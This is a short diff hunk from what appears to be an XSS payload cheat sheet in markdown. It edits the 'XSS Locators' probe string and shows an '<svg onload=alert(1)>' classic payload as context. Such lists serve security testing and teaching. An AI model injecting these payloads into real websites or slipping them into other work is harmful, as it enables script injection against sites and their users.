@@ -115,7 +115,7 @@ An attacker who exploits a cross-site scripting vulnerability is typically able 
 ## XSS Payload
 --------------------------------------------------------------------
 XSS Locators:
-'';!--"<XSS>=&{()}
+'q';!--"xss"<XSS>=&{(p)}
 --------------------------------------------------------------------
 Classic Payloads:
 <svg onload=alert(1)>
